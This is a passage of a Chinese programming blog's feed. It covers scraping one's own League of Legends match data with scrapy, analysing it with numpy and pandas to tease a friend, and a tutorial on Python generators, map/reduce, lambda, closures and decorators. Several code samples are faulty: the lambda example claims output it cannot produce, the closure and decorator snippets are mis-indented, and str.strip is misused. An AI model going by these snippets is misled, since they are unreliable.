title="入库"></a>入库</h2><p>详细数据是一个很大的json,处理起来多有不便,所以把数据入库.也不是所有数据都是需要的,挑比较关键的比如伤害,补刀,击杀等.</p><p>当然这里可以选择使用mangodb,这样就不需要麻烦的将数据处理再入库.</p><p>当然入库的时候还需要整理,删掉中途崩溃的对局,人机对局等等无效数据</p><p>篇幅起见,具体代码可以去github浏览.</p><p>这里使用的sqlite.只简单的将数据放到库里,数据量并不多,3000场数据也在10MB以内,因此也不需要额外的优化.</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>经过上面的准备,接下来就是正式的抓内鬼了:D</p><p>为了让这个内鬼自己都心服口服,显然需要各种角度的数据对比.</p><p>我想到了以下几个数据:</p><ol><li>各位置场均伤害 – 比赛时长 折线图 (伤害)</li><li>各位置场均补刀 – 比赛时长 折线图 (补刀)</li><li>失败场次中与对线玩家伤害比  (养爹值)</li><li>胜率场次中与对线玩家伤害比 (CARRY值)</li><li>各位置段位 — 场均伤害 折线图 (判断该玩家大致在哪个段位中)</li><li>各位置玩家场均伤害 – 日期 标准差 (判断游戏水平进步或退步)</li><li>各位置场均前十分钟中对线伤害差 (对线能力)</li><li>单个英雄场均伤害 – 比赛时长 (如果内鬼对自己某个英雄自信,可以与平均线对比)</li></ol><p>数据处理用numpy非常方便,将其二维list转成numpy中的array数据类型,就可以使用各种矩阵的操作快速处理所需的数据.</p><p>具体过程有些绕,但实际上就是简单的加减乘除,善用numpy与pandas的各种运算函数,就算代码写的和我一样丑,也总能得到想要的数据,就不细说了.可以看github代码.</p><p>最后使用pandas绘制图表,生成png格式的图片.</p><p>整个思路很简单,午时已到!让我来看看平时被喷的最多的那位是不是内鬼.</p><p>![伤害](MIDDLE 场均伤害 - 游戏时间折线图.png)</p><p>![伤害累计](MIDDLE 场均伤害累计 - 游戏时间图.png)</p><p>![补刀](MIDDLE 场均补刀 - 游戏时间图.png)</p><p>![补刀标准差](MIDDLE 场均补刀标准差 - 游戏时间图.png)</p><p>![标准差](MIDDLE 场均伤害标准差 - 游戏时间图.png)</p><p>(备注:横坐标是游戏时间,从15分钟开始计算,每条折线代表一个玩家,k是我,p是我想要抓的那个内鬼)</p><p>因为虽然我爬了三四个账号,但实际上去重后数据样本也不过2500场,其中我打的中单也就五六百场,横坐标是游戏时间,每分钟一个点,因此每个点只有几十场数据,数据样本并不多,误差就比较大,还好依然能看出大致实力..</p><p>我选了我们都玩的比较多的位置以及这个位置上他自认玩得最好的英雄.<strong>杀人必须诛心</strong>,我要在他最擅长的位置上用他最擅长的英雄打败他.</p><p>而这位p姓友人自认亚索很强.死亡如风,常伴汝身.就来看看单个英雄</p><p>![亚索](MIDDLE 亚索场均伤害 - 游戏时间折线图.png)</p><p>![亚索标准差](MIDDLE Yasuo场均伤害标准差 - 游戏时间图.png)</p><p>可以看到这位p姓的友人在中单位置上伤害与补刀在开黑的车队中垫底,而且还低于平均线.甚至他最引以为豪的60%胜率亚索实际上也低于平均线,被我全面碾压.你还说你不是内鬼?</p><p>而平时车队互动之中被互动的最多的也是他,事实证明结果和直观感受大致相符.当然我这只是孤例大家也可以尝试一下,是否普遍.</p><p>这里只展示这几个数据,其他数据也只是加减乘除运算,花点时间就能弄出来.</p><p>经过几天的折腾最终计算出他在所有数据上都低于车队,也低于全体玩家平均值.各项数据基本低于平均线10%-15%之间,除了在养爹指数上远高于常人.</p><p>特别是在他辅助的AD的平均伤害上,低于我们带过的任何一个妹子.</p><p>还有是在不同段位玩家的平均伤害的统计上,他低于任何一个段位.而我们平时打的局基本在白金到钻石.可见这个B不单单是混这么简单,是实打实的坑人,还是全方位的坑.</p><p>给个段位与平均伤害的数据:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1000-1200: 19412 </span><br><span class="line">1200-1400: 18377</span><br><span class="line">1400-1600: 18779</span><br><span class="line">1600-1800: 19990</span><br><span class="line">1800-2000: 20506</span><br><span class="line">&gt;2000: 23301</span><br></pre></td></tr></table></figure><p>因为1000是初始分,因此有些小号在鱼塘里导致数据偏高.除了这个数据,可以很明显的看到段位与伤害是成正比的.当然这个数据中包含了辅助,各位双C玩家不要以此为准.可以自己爬一下测试下.</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这些数据还可以玩出很多花,比如由于游戏场次id是顺序递增的,可以估算出某一时间段的同时在线人数.还可以统计版本与伤害的变化,看看拳头是不是一直在削弱ad.如果一个人的数据量够多,通过判断与平均数的标准差,看看实力是不是变强了.</p><p>(事实上,ad在18年末有过一个很大的加强.而且ad的平均伤害一直是高于中单的.ad并没有我们口中的这么弱.)</p><p>不管平时怎么吹牛逼,数据是不会作假的.当然这不是专业的数据分析,很多计算方式并不严谨.</p><p>迫于时间有限,我只能折腾到这了.</p><p>成功抓出了内鬼后,在小群里被我们一顿群嘲,他终于认清现实将游戏名字改成</p><p><img src="QQ%E5%9B%BE%E7%89%8720200320002132.png" alt="name"></p><p>各位小伙伴也可以尝试一下抓内鬼,其中快感,难以言喻.  ^_^</p><p>最后,源码以及我个人的游戏数据放在<a href="https://github.com/M09Ic/LOL_traitor">github</a>上了,代码写的比较丑,又是一个需求一次修改.导致最后代码不能直接使用,还请见谅.可以以此为参考自己做一下,用来学习Python挺不错的.</p><p>代码太丑就不求Star了,大伙别骂我,知错了知错了.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;em&gt;(本文首发于星盟安全团队微信公众号,链接:&lt;a href=&quot;https://mp.weixin.qq.com/s/85gX5ci1ih9Mb9tPIx45tg&quot;&gt;https://mp.weixin.qq.com/s/85gX5ci1ih9Mb9tPIx45tg&lt;/a&gt;  ,并由团队发表至secpulse,链接:&lt;a href=&quot;https://www.secpulse.com/archives/126641.html&quot;&gt;https://www.secpulse.com/archives/126641.html&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;update:2020.4.2:文章竟然被云舒大神转发了.开心!!&lt;/p&gt;</summary>
    
    
    
    <category term="编程" scheme="https://m09ic.top/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="python" scheme="https://m09ic.top/tags/python/"/>
    
    <category term="数据分析" scheme="https://m09ic.top/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Python 爬虫,数据分析与黑魔法</title>
    <link href="https://m09ic.top/posts/56383/"/>
    <id>https://m09ic.top/posts/56383/</id>
    <published>2020-03-05T17:24:49.000Z</published>
    <updated>2021-01-04T14:52:45.181Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>我并不太喜欢照抄官方文档式的文章,所以下面的内容都只是抛砖引玉,善于使用搜索引擎与官方文档.</p><h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><p>python自带了一个urllib,但是并不好用,requests就是urllib的二次封装,更加人性化与方便.</p><p>缺点就是requests是阻塞式的库,如果有高并发的需求,需要</p><p>requests库比较常用,各位应该都会用.</p><p>最常用的用法就是:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发送GET请求</span></span><br><span class="line">requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST请求</span></span><br><span class="line">requests.post(url,data=)</span><br></pre></td></tr></table></figure><p>当然还可以定制各种参数</p><p>比较常用的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;设置post body</span><br><span class="line">params&#x3D;设置get 参数</span><br><span class="line">cookies&#x3D;  设置cookies</span><br><span class="line">headers&#x3D;  设置请求头,包括cookies</span><br><span class="line">files&#x3D;设置上传文件</span><br><span class="line">allow_redirects&#x3D;False 拒绝重定向,默认为True</span><br><span class="line">timeout&#x3D;设置超时时间</span><br></pre></td></tr></table></figure><p>总得来说,requests能满足大多数情况下的基本需求,但是性能需要开发者去折腾.</p><p>因此,如果是写扫描器或爬虫之类的工具,requests并不是很好的选择.</p><h2 id="scrapy"><a href="#scrapy" class="headerlink" title="scrapy"></a>scrapy</h2><p>如果是开发扫描器或者爬虫,推荐使用python的scrapy.</p><p>scrapy最初设计是爬虫开发框架,但扫描器和爬虫原理其实一模一样,开发扫描器也未尝不可.</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>我使用的是anaconda来管理python.</p><p><code>conda install scrapy</code></p><p>就完事了,如果是python官方则需要安装win32api之类的库,所以推荐使用anaconda.</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>安装完了运行<code>scrapy bench</code>验证是否安装成功,顺便测试下速度.</p><p><img src="image-20200222145343574.png" alt="image-20200222145343574"></p><p>我这台电脑与网络环境最快可以达到3360个页面每分钟,当然还取决于页面返回内容的大小.这比自己搞高并发简单多了.</p><p>各种详细参数与使用还请看<a href="https://docs.scrapy.org/en/latest/">官方文档</a>,这里只简述最基本的概念.</p><p>以爬取英雄联盟的对战数据为例,这并不是个很好的例子,因为lol的数据是通过api返回的json数据,而不是标准的html,这里是为了和后面的数据分析统一.</p><p>如果要从html中筛选数据,可以看看官方教程.我个人认为xpath的方式比beautifulsoup之类的方式方便很多.chrome浏览器上有个xpath helper插件,可以帮你快速测试xpath是否正确.</p><p>运行<code>scrapy startproject loldata</code>新建项目,会生成以下文件</p><ul><li><p><code>scrapy.cfg</code>: 项目的配置文件</p></li><li><p><code>loldata/items.py</code>: 项目中的item文件,定义需要爬取的内容.</p></li><li><p><code>loldata/spiders/</code>: 放置spider代码的目录.</p></li><li><p><code>loldata/settings.py</code>: scrapy的设置文件.</p></li><li><p><code>loldata/middlewares.py</code>:spider的下载中间件,用来处理爬虫的请求和响应,假如需要定制代理池,随机UA头,cookies池,验证码处理之类的功能,可以在这里添加.</p></li><li><p><code>loldata/pipelines.py</code>: spider获取的指定数据在返回时,会先经过pipelines,如果有入库之类的操作,可以在这里进行.</p></li></ul><p>接下来创建一个spider,运行<code>scrapy genspider spidername &quot;https://lol.qq.com/&quot;</code></p><p>(这个url可以随便填,用来防止爬虫爬到其他网站的,可以在代码中修改或删除.)</p><p>会创建一个spider文件,内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class GamejsonspiderSpider(scrapy.Spider):</span><br><span class="line">    name &#x3D; &#39;gamejsonspider&#39;</span><br><span class="line">    allowed_domains &#x3D; [&#39;https:&#x2F;&#x2F;lol.qq.com&#x2F;&#39;]</span><br><span class="line">    start_urls &#x3D; [&#39;http:&#x2F;&#x2F;https:&#x2F;&#x2F;lol.qq.com&#x2F;&#x2F;&#39;]</span><br><span class="line"></span><br><span class="line">    def parse(self, response):</span><br><span class="line">        pass</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这里,可以定制一个spider去实现爬虫或扫描器的功能.以lol对战数据为例.</p><p>lol的对战数据需要登录后才能访问,也就是需要设置Cookies.</p><p>而且该数据是以api的形式获取的json数据,就用不到scrapy自带的强大的xpath解析html的功能了,只需要把json数据全部拿到然后入库保存即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> add</span><br><span class="line"><span class="keyword">import</span> json,os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span>(<span class="params">cookies</span>):</span></span><br><span class="line">    cookie_dict = &#123;&#125;</span><br><span class="line">    cookies = cookies.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = cookies.split(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        keys = i.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        values = i.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        cookie_dict[keys] = values</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cookie_dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GamejsonspiderSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;gamejsonspider&#x27;</span></span><br><span class="line">    start_urls = <span class="string">&#x27;http://lol.sw.game.qq.com/lol/api/?c=Battle&amp;a=matchList&amp;areaId=1&amp;accountId=2944742458&amp;queueId=70,72,73,75,76,78,96,98,100,300,310,313,317,318,325,400,420,430,450,460,600,610,940,950,960,980,990,420,440,470,83,800,810,820,830,840,850&amp;r1=matchList&#x27;</span></span><br><span class="line">    Cookie = <span class="string">&quot;从浏览器直接复制的Cookie&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_requests</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">yield</span> Request(url=self.start_urls,cookies=transform(self.Cookie),callback=self.parse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        data = <span class="built_in">str</span>(response.body,encoding=<span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&quot;var matchList =&quot;</span>)</span><br><span class="line">        jsondata = json.loads(data)</span><br><span class="line">        gameids = jsondata[<span class="string">&quot;msg&quot;</span>][<span class="string">&quot;games&quot;</span>]</span><br><span class="line">        gameids = reduce(add,<span class="built_in">map</span>(<span class="keyword">lambda</span> x: [x[<span class="string">&quot;gameId&quot;</span>]],gameids))</span><br><span class="line">        <span class="keyword">for</span> gameid <span class="keyword">in</span> gameids:</span><br><span class="line">            url = <span class="string">&quot;https://lol.sw.game.qq.com/lol/api/?c=Battle&amp;a=combatGains&amp;areaId=1&amp;gameId=%s&amp;r1=combatGains&quot;</span>%gameid</span><br><span class="line">            <span class="keyword">yield</span> Request(url=url,cookies=transform(self.Cookie),callback=self.parsedetail,meta=&#123;<span class="string">&#x27;gameid&#x27;</span>:gameid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parsedetail</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./battledetaildata&quot;</span>):</span><br><span class="line">            os.mkdir(<span class="string">&quot;./battledetaildata&quot;</span>)</span><br><span class="line">        data = <span class="built_in">str</span>(response.body).strip(<span class="string">&quot;var combatGains = &quot;</span>)</span><br><span class="line">        datafile = <span class="built_in">open</span>(<span class="string">&quot;./battledetaildata/%s.json&quot;</span> % response.meta[<span class="string">&#x27;gameid&#x27;</span>], <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        print( response.meta[<span class="string">&#x27;gameid&#x27;</span>])</span><br><span class="line">        datafile.write(data)</span><br><span class="line">        datafile.close()</span><br></pre></td></tr></table></figure><p>scrapy引擎会先从<code>start_urls</code>开始,如果<code>start_urls</code>是一个list,那么会一个一个爬.</p><p>如果重写<code>start_requests</code>方法,那么所有<code>start_urls</code>会先经过<code>start_requests</code>处理.为的就是带上cookie请求.当然,如果在setting.py中设置cookie,就不需要在每个Request设置了.Request中的callback参数会把response送入响应的方法中进一步处理.一直到拿到你需要的数据为止.</p><p>稍微一提,如果需要在Request中传递参数,可以添加meta参数.</p><p>写好代码后,在命令行运行<code>scrapy crawl gamejsonspider</code>,爬虫就开始了,完全不需要我们去考虑高并发是如何实现的,速度比纯requests库快了不知道多少倍.</p><p><img src="image-20200222172705937.png" alt="image-20200222172705937"></p><p>本文提到的scrapy只是抛砖引玉,更多详细用法可以去搜索引擎找找.</p><h1 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h1><p>将数据保存到sqlite数据库后,就可以使用分析了.</p><p>数据分析主要使用以下三个库.</p><ul><li>numpy : 负责数据处理</li><li>pandas : 负责数据分析</li><li>matplotlib 生成图表</li></ul><h3 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h3><p>从数据库中取出的数据是一个大的list,这个list的每个元素就是数据库查询结果的一行,而元素则是tuple,由每个字段的值构成.</p><p>就像这样:<code>[(&#39;召唤师1&#39;,&#39;12345&#39;),(&#39;召唤师2&#39;,&#39;32412&#39;)]</code></p><p>这样的数据并不方便处理,只能通过层层循环嵌套去判断,代码写起来可读性差,也很容易把自己绕晕.</p><p>可以把从数据库中取出的数据转化成numpy中带的数据结构array(矩阵),再使用numpy中的函数处理,代码可读性会高很多,逻辑也清晰明了.</p><p>numpy的具体使用网上一搜文章一堆.多找几篇参考对比下尝试一下,很快就能学会基本的用法.</p><h3 id="pandas"><a href="#pandas" class="headerlink" title="pandas"></a>pandas</h3><p>使用numpy处理完的数据,再使用pandas生成数据表.就像这样:</p><p><img src="image-20200222175341940.png" alt="image-20200222175341940"></p><p>pandas有两个基本对象,Series和DataFrame,上面的图就是DataFrame,而Series类似带索引的list.</p><p>pandas的画图功能是基于matplotlib,只是pycharm只支持matplotlib的预览.</p><p>pandas支持柱状图,散点图,直方图等等等等,稍微浏览下官方文档,很容易上手.</p><p>推荐阅读<a href="https://www.pypandas.cn/docs/getting_started/10min.html">十分钟上手pandas</a></p><p><img src="image-20200222182907310.png" alt="image-20200222182907310"></p><h3 id="pandas爬虫"><a href="#pandas爬虫" class="headerlink" title="pandas爬虫"></a>pandas爬虫</h3><p>(补充)</p><p>我原本以为pandas是数据分析的工具,突然发现pandas也可以用来写爬虫,在特定用途是,甚至用的比scrapy更加舒服.</p><p>pandas中有从各种数据源取数据的函数.例如<code>read_excel()</code>,<code>read_csv()</code>,<code>read_html()</code>等等.</p><p>这个<code>read_html()</code>非常神奇,把我惊到了.</p><p><code>read_html()</code>会将html页面中table标签中的数据转化为DataFrame类型</p><p>用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">pd.read_html(url)</span><br></pre></td></tr></table></figure><p>就这么简单,数据就拿到了.所以当在爬一些数据在table中的网页时,简直是神器.远比任何其他爬虫都方便百倍.</p><h1 id="python黑魔法"><a href="#python黑魔法" class="headerlink" title="python黑魔法"></a>python黑魔法</h1><p>当开始尝试使用python进行数据分析,发现有些需求如果使用分支循环语句会导致三四层甚至更多层的嵌套.虽然嵌套可以封装成函数,但是这样调用链又会变得复杂,牵一发而动全身.</p><p>这时候,想起来之前学过的一些python的高级特性.使用这些高级特性可以让代码变得简洁易读.</p><p>建议阅读<a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017269809315232">python 高级特性 —- 廖雪峰</a>,下面我只做简单介绍.</p><p>熟练的使用这些特性可以帮助你写出更加pythonic的代码(虽然我自己写的代码也丑).</p><h3 id="迭代器与生成器"><a href="#迭代器与生成器" class="headerlink" title="迭代器与生成器"></a>迭代器与生成器</h3><p>可用for循环的对象都是可迭代对象,但是需要注意<strong>可迭代对象不一定是迭代器</strong>.</p><p>list,string,dict之类的都是可迭代对象,但不是迭代器.</p><p>因为迭代器设计之初是用来<strong>惰性</strong>保存可迭代对象的,比如全体自然数.任何计算机都不可能保存下全体自然数,而迭代器就是一个不断生成下一个自然数的工具.因此list这种直接将值保存在内存中的对象不是迭代器.</p><p>迭代器本质上是一个数据流,可以不断调用<code>next()</code>函数返回下一个值.</p><p>生成器本质是用来返回迭代器的函数.</p><p>看一个生成器的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def gen(n):</span><br><span class="line">    while n&gt;0:</span><br><span class="line">        n -&#x3D; 1</span><br><span class="line">        yield n</span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line">print(gen)</span><br><span class="line">g &#x3D; gen(5)</span><br><span class="line">print(gen(5))</span><br><span class="line">for i in gen(5):</span><br><span class="line">    print(i)</span><br><span class="line">#等价于</span><br><span class="line">for i in range(5):</span><br><span class="line">    print(next(g))</span><br><span class="line">#&lt;function gen at 0x000002627D18E708&gt;</span><br><span class="line">#&lt;generator object gen at 0x000002627E274EC8&gt;</span><br><span class="line">#4</span><br><span class="line">#3</span><br><span class="line">#2</span><br><span class="line">#1</span><br><span class="line">#0</span><br></pre></td></tr></table></figure><h3 id="map-和reduce"><a href="#map-和reduce" class="headerlink" title="map 和reduce"></a>map 和reduce</h3><p>google的一位大佬是map和reduce的传教士,使用者两个特性确实可以写出更简洁的代码.论文:<a href="http://research.google.com/archive/mapreduce.html">MapReduce: Simplified Data Processing on Large Clusters</a></p><p>引用廖雪峰对map的描述:</p><blockquote><p> <code>map()</code>函数接收两个参数，一个是函数，一个是<code>Iterable</code>，<code>map</code>将传入的函数依次作用到序列的每个元素，并把结果作为新的<code>Iterator</code>返回</p></blockquote><p>直接看例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def add1(x):</span><br><span class="line">    return x+1</span><br><span class="line"></span><br><span class="line">l &#x3D; [1,2,3,4,5]</span><br><span class="line">print(list(map(add1,l)))</span><br><span class="line"></span><br><span class="line">#[2, 3, 4, 5, 6]</span><br></pre></td></tr></table></figure><p>list里的每个元素都加了1,这就免去了写一个for循环.</p><p>reduce也差不多,但是它会将第一次的返回值传入到下一次函数的输入中,类似:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reduce(f, [x1, x2, x3, x4]) &#x3D; f(f(f(x1, x2), x3), x4)</span><br></pre></td></tr></table></figure><p>类似的高阶函数还有<code>filter</code>和<code>sorted</code>分别用来生成过滤与排序的函数.用法也类似,详情可看官方文档.</p><h3 id="lambda-匿名函数"><a href="#lambda-匿名函数" class="headerlink" title="lambda(匿名函数)"></a>lambda(匿名函数)</h3><p>假如我需要使用刚才的给数组中所有元素加一,这样需要重新定义一个函数,但是为了这么简单的功能重新定义函数牺牲了代码的简洁.</p><p>onelinerpython.</p><p>所以这时候就需要用到了lambda.</p><p>把刚才的那个功能改写成lambda形式的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l &#x3D; [1,2,3,4,5]</span><br><span class="line">print(list(map(lambda x,y:x+1,l)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#[2, 3, 4, 5, 6]</span><br></pre></td></tr></table></figure><h3 id="工厂函数"><a href="#工厂函数" class="headerlink" title="工厂函数"></a>工厂函数</h3><p>python支持在函数中定义函数.</p><p>比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def addx(x):</span><br><span class="line">    def ax(n):</span><br><span class="line">        n +&#x3D; x</span><br><span class="line">        return n</span><br><span class="line">    return ax</span><br><span class="line"></span><br><span class="line">add2 &#x3D; addx(2)</span><br><span class="line">print(add2)</span><br><span class="line">print(add2(1))</span><br><span class="line"></span><br><span class="line">#&lt;function addx.&lt;locals&gt;.ax at 0x0000023D5D76CEE8&gt;</span><br><span class="line">#3</span><br></pre></td></tr></table></figure><p>我在这之前特意不提”闭包”二字,是不希望让这两个没有明确中文语义的混淆了概念.实际上,工厂函数返回的时候还会将上层函数中的变量一同返回.</p><p>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def addx(x):</span><br><span class="line">example &#x3D; &quot;闭包&quot;</span><br><span class="line">    def ax(n):</span><br><span class="line">        n +&#x3D; x</span><br><span class="line">        print(example)</span><br><span class="line">        return n</span><br><span class="line">    return ax</span><br><span class="line"></span><br><span class="line">add2 &#x3D; addx(2)</span><br><span class="line">print(add2)</span><br><span class="line">print(add2(1))</span><br><span class="line"></span><br><span class="line">#&lt;function addx.&lt;locals&gt;.ax at 0x0000023D5D76CEE8&gt;</span><br><span class="line">#闭包</span><br><span class="line">#3</span><br></pre></td></tr></table></figure><p>当工厂函数生成了一个函数对象,这个函数对象中依旧能访问有上层函数中的变量.这个特性就叫做闭包.<br>例子中的变量是<code>example</code>.</p><h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><p>当一个工厂函数传入值是函数,返回值也是函数时,那么这个工厂函数就可以叫做装饰器.</p><p>而python的开发者将这种用法包装成了语法糖,让代码更加优雅与易读.</p><p>python用了<code>@</code>来表示装饰器语法,用廖雪峰老师的例子.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def log(func):</span><br><span class="line">    def wrapper(*args, **kw):</span><br><span class="line">        print(&#39;call %s():&#39; % func.__name__)</span><br><span class="line">        return func(*args, **kw)</span><br><span class="line">    return wrapper</span><br><span class="line">   </span><br><span class="line">@log</span><br><span class="line">def test():</span><br><span class="line">print(&quot;test&quot;)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line">#call test():</span><br><span class="line">#test</span><br><span class="line">#等于不加@标记的log(test)()</span><br><span class="line">#甚至觉得有点php內味了</span><br></pre></td></tr></table></figure><p>可以看到,<code>@</code>语法只是将工厂函数简写了而已,这种简化我们将其叫做”装饰器”.</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>python的这些黑魔法并不是python独有的,这些概念大多属于函数式编程,在php,java这些现代的语言中,同样可以找到类似的语法.</p><p>我一圈用下来,认为python是最舒服的.在python中掌握了这些概念,换一种语言也就是熟悉下语法的事情.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;我并不太喜欢照抄官方文档式的文章,所以下面的内容都只是抛砖引玉,善于使用搜索引擎与官方文档.&lt;/p&gt;
